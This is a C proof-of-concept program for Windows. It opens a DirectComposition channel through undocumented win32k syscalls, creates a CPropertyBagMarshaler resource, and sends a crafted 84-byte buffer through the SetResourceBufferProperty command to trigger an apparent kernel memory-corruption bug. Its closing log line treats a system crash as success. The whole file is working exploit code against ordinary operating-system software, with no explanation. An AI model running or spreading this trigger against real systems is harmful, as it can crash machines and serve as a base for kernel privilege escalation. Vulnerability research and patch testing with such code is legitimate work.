
#include <stdio.h>
#include <tchar.h>
#include <windows.h>
#include <winternl.h>
#include <strsafe.h>

#pragma comment(lib, "win32u.lib")

enum DCPROCESSCOMMANDID
{
	nCmdProcessCommandBufferIterator,
	nCmdCreateResource,
	nCmdOpenSharedResource,
	nCmdReleaseResource,
	nCmdGetAnimationTime,
	nCmdCapturePointer,
	nCmdOpenSharedResourceHandle,
	nCmdSetResourceCallbackId,
	nCmdSetResourceIntegerProperty,
	nCmdSetResourceFloatProperty,
	nCmdSetResourceHandleProperty,
	nCmdSetResourceBufferProperty,
	nCmdSetResourceReferenceProperty,
	nCmdSetResourceReferenceArrayProperty,
	nCmdSetResourceAnimationProperty,
	nCmdSetResourceDeletedNotificationTag,
	nCmdAddVisualChild,
	nCmdRedirectMouseToHwnd,
	nCmdSetVisualInputSink,
	nCmdRemoveVisualChild
};

EXTERN_C
NTSTATUS
NTAPI NtDCompositionCreateChannel(
	OUT PHANDLE pArgChannelHandle,
	IN OUT PSIZE_T pArgSectionSize,
	OUT PVOID* pArgSectionBaseMapInProcess
);

EXTERN_C
NTSTATUS
NTAPI
NtDCompositionProcessChannelBatchBuffer(
	IN HANDLE hChannel,
	IN DWORD dwArgStart,
	OUT PDWORD pOutArg1,
	OUT PDWORD pOutArg2);


typedef enum { L_DEBUG, L_INFO, L_WARN, L_ERROR } LEVEL, *PLEVEL;
#define MAX_LOG_MESSAGE 1024

BOOL LogMessage(LEVEL Level, LPCTSTR Format, ...)
{
	TCHAR Buffer[MAX_LOG_MESSAGE] = { 0 };
	va_list Args;

	va_start(Args, Format);
	StringCchVPrintf(Buffer, MAX_LOG_MESSAGE, Format, Args);
	va_end(Args);

	switch (Level) {
	case L_DEBUG: _ftprintf(stdout, TEXT("[?] %s\n"), Buffer); break;
	case L_INFO:  _ftprintf(stdout, TEXT("[+] %s\n"), Buffer); break;
	case L_WARN:  _ftprintf(stderr, TEXT("[*] %s\n"), Buffer); break;
	case L_ERROR: _ftprintf(stderr, TEXT("[!] %s\n"), Buffer); break;
	}

	fflush(stdout);
	fflush(stderr);

	return TRUE;
}

int main(int argc, TCHAR* argv[])
{
	HANDLE hChannel;
	NTSTATUS ntStatus;
	SIZE_T SectionSize = 0x1000;
	PVOID pMappedAddress = NULL;
	DWORD dwArg1, dwArg2;
	HANDLE hResource = (HANDLE)1;
	
	//
	// convert to gui thread
	//

	LoadLibrary(TEXT("user32"));
	
	//
	// create a new channel
	//
	
	ntStatus = NtDCompositionCreateChannel(&hChannel, &SectionSize, &pMappedAddress);
	if (!NT_SUCCESS(ntStatus)){
		LogMessage(L_ERROR, TEXT("Create channel error code:0x%08x"), ntStatus);
		return -1;
	}
	
	LogMessage(L_INFO, TEXT("Create channel ok, channel=0x%x"), hChannel);
	
	//
	// create a new resource with type - CPropertyBagMarshaler
	//

	*(DWORD*)(pMappedAddress) = nCmdCreateResource;
	*(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)hResource;
	*(DWORD*)((PUCHAR)pMappedAddress + 8) = (DWORD)0x70;
	*(DWORD*)((PUCHAR)pMappedAddress + 0xC) = FALSE;

	ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);
	if (!NT_SUCCESS(ntStatus)) {
		LogMessage(L_ERROR, TEXT("Create resource error code:0x%08x"), ntStatus);
		return -1;
	}
	
	//
	// set argument of NtDCompositionProcessChannelBatchBuffer
	//
	
	UCHAR szBuff[] = { 0x2d, 0xf7, 0xde, 0x71, 0x14, 0x07, 0xac, 0x58, 0xe4, 0x19, 0xd8, 0x64, 0x36, 0xf2, 0x0f, 0x71,
		0x1c, 0x4f, 0x3c, 0xac, 0x85, 0xa5, 0x3d, 0xea, 0x2e, 0xfc, 0x8b, 0xca, 0xe9, 0xb6, 0xbf, 0x7b,
		0xc0, 0x5d, 0xbc, 0x98, 0xba, 0xd4, 0xa6, 0x0b, 0x18, 0x3d, 0x3e, 0x96, 0x2e, 0xaf, 0x1c, 0x90,
		0x90, 0x51, 0x64, 0x1a, 0xdc, 0xa3, 0x0c, 0x8e, 0xee, 0x1d, 0xd2, 0x71, 0xa5, 0xf4, 0x60, 0x7b,
		0x08, 0xe1, 0x16, 0xf1, 0xd5, 0x29, 0x53, 0xee, 0xe6, 0xdc, 0x3c, 0xcb, 0xf8, 0x64, 0x5e, 0xb0,
		0x2e, 0x95, 0x73, 0xba };


	*(DWORD*)pMappedAddress = nCmdSetResourceBufferProperty;
	*(HANDLE*)((PUCHAR)pMappedAddress + 4) = hResource;
	*(DWORD*)((PUCHAR)pMappedAddress + 8) = 1;
	*(DWORD*)((PUCHAR)pMappedAddress + 0xc) = sizeof(szBuff);
	CopyMemory((PUCHAR)pMappedAddress + 0x10, szBuff, sizeof(szBuff));

	
	//
	// call the function
	//
	
	LogMessage(L_INFO, TEXT("NtDCompositionSetResourceBufferProperty(0x%x, 0x%x, 0x%x, buf, 0x%x)"), hChannel,
		hResource, 1, sizeof(szBuff));
	ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x14 + sizeof(szBuff), &dwArg1, &dwArg2);

	LogMessage(L_ERROR, TEXT("!!if go here, the poc is failed, try again!!"));
	
	return 0;
}